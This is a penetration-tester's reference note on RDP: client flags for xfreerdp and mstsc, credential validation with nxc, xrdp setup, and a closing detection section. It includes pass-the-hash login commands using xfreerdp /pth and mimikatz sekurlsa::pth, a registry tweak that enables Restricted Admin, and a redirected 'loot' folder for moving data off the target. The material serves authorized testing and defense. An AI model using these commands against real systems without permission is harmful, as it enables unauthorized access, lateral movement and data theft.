# rdp

Remote Desktop (3389) client reference — connect to an RDP target **from Linux** (`xfreerdp`/`rdesktop`/`remmina`) or **from Windows** (`mstsc`), pass-the-hash into it, and move files over the session. The login-in-context version is [Remote Access — RDP](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#rdp-3389--interactive-desktop); this note is the full client flag reference and both attacker directions.

> Authorized engagements only. RDP logs the interactive logon (**4624 type 10**) and leaves artifacts in the user's profile — it's the opposite of quiet.

## Contents

- [Validate the credential first](#validate-the-credential-first)
- [From Linux → target (xfreerdp)](#from-linux--target-xfreerdp)
- [From Windows → target (mstsc)](#from-windows--target-mstsc)
- [RDP into a Linux host (xrdp)](#rdp-into-a-linux-host-xrdp)
- [Pass-the-hash](#pass-the-hash)
- [File transfer over RDP](#file-transfer-over-rdp)
- [Troubleshooting](#troubleshooting)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Validate the credential first

Don't burn a lockout attempt in a GUI — confirm the account works and that RDP will accept it:

```bash
nxc rdp <target> -u <user> -p '<pass>'          # [+] valid; some builds print (Pwn3d!) if login will succeed
nxc rdp <target> -u <user> -H <nthash>          # pass-the-hash check
```

More on credential forms and sweeping in [Credentialed Enumeration & Access](../Enum/Credentialed%20Enumeration%20%26%20Access.md#rdp-3389).

## From Linux → target (xfreerdp)

`xfreerdp` is the workhorse. The binary is `xfreerdp` (FreeRDP 2) or `xfreerdp3` (FreeRDP 3) — same flags below.

```bash
# Basic login (ignore the self-signed cert, or it prompts every time)
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore

# Domain account
xfreerdp /v:<target> /d:<domain> /u:<user> /p:'<pass>' /cert:ignore

# The one you actually want: clipboard, auto-resize, and a shared folder for loot
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp/loot

# Fullscreen / fixed size / multi-monitor
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore /f               # fullscreen (Ctrl+Alt+Enter toggles)
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore /w:1440 /h:900
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore /multimon

# Flaky link — compress and let it pick codecs
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore /compression /network:auto

# Force the security protocol when NLA negotiation fails (see Troubleshooting)
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore /sec:nla        # or /sec:tls, /sec:rdp
```

Other clients:

```bash
rdesktop -u <user> -p '<pass>' <target>        # older, simpler; no NLA/clipboard niceties
remmina                                        # GUI with saved profiles — good for many hosts
```

## From Windows → target (mstsc)

On a Windows foothold, use the native client. Store the credential first so you're not retyping it, then connect:

```powershell
cmdkey /generic:TERMSRV/<target> /user:<user> /pass:<pass>    # cache the cred for this target
mstsc /v:<target>                                             # connect
mstsc /v:<target> /restrictedAdmin                            # no plaintext sent — and enables PtH (below)
mstsc /v:<target> /admin                                     # connect to the admin/console session
```

`cmdkey /list` shows cached creds; `cmdkey /delete:TERMSRV/<target>` cleans up after.

## RDP into a Linux host (xrdp)

This is the "**Windows → Linux**" direction: a Linux box only speaks RDP if it's running an RDP **server**. Install one on the target, then connect from any client (`mstsc`, `xfreerdp`) exactly as above:

```bash
# On the Linux TARGET (needs a desktop environment installed)
sudo apt install xrdp && sudo systemctl enable --now xrdp      # now listening on 3389
sudo adduser xrdp ssl-cert                                     # fixes a common black-screen/cert issue
```

Then from Windows: `mstsc /v:<linux-host>`; from Linux: `xfreerdp /v:<linux-host> /u:<user> /p:'<pass>' /cert:ignore`. For actually *getting a shell* on a Linux box you'd normally use [ssh](ssh.md), not stand up xrdp — this is for when a GUI is the requirement.

## Pass-the-hash

Works only when **Restricted Admin mode** is enabled on the target (else you get "Account Restrictions are preventing this user from signing in").

```bash
# From Linux
xfreerdp /v:<target> /u:<user> /pth:<nthash> /cert:ignore
```

```text
:: From Windows, via mimikatz — inject the hash, then launch mstsc in restricted-admin mode
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nthash> /run:"mstsc.exe /restrictedadmin /v:<target>"
```

Enable Restricted Admin on a host you control (registry): `DisableRestrictedAdmin = 0` under `HKLM\System\CurrentControlSet\Control\Lsa`. See [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) for where the hash comes from.

## File transfer over RDP

No SMB/SSH needed — share a local folder into the session:

- **Linux:** `/drive:share,/tmp/loot` (above) mounts `/tmp/loot` as a redirected drive; on the target it's under `\\tsclient\share` (This PC → Redirected drives).
- **Windows:** `mstsc` → *Show Options → Local Resources → More → Drives* to redirect a local drive the same way.
- **Clipboard:** `+clipboard` (xfreerdp) enables copy-paste of text and files both ways.

## Troubleshooting

| Symptom | Fix |
| --- | --- |
| `CredSSP` / NLA negotiation error | update FreeRDP; or force `/sec:tls` / `/sec:rdp`; target may require NLA (`/sec:nla`) |
| Cert prompt every launch | `/cert:ignore` (FreeRDP 3) — old v2 builds used `/cert-ignore` |
| PtH → "Account Restrictions" | target lacks **Restricted Admin** — use a plaintext password or another vector |
| `ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED` | creds expired — reset over SMB (`rpcclient`/impacket `changepasswd`) and retry |
| Black screen on xrdp (Linux target) | `adduser xrdp ssl-cert`; ensure a desktop session/`~/.xsession` is set |

## Defense / detection

- Require **Network Level Auth**; restrict 3389 to jump/admin hosts and VPN; never expose it to the internet.
- **Disable Restricted Admin** unless a tool needs it — leaving it on enables pass-the-hash over RDP.
- Monitor **4624 type 10** (RemoteInteractive), **4778/4779** (session connect/reconnect), and new source IPs; enforce MFA on remote access.
- Watch for `cmdkey` caching and `mstsc` spawned by `sekurlsa::pth` (a process launched with injected credentials).

## Related

[Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#rdp-3389--interactive-desktop) · [Credentialed Enumeration & Access](../Enum/Credentialed%20Enumeration%20%26%20Access.md) · [ssh](ssh.md) · [Pivoting & Tunneling](../Networking/Pivoting%20%26%20Tunneling.md) (expose an internal 3389 to your box) · [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) · [nmap](nmap.md) · [folder README](README.md)
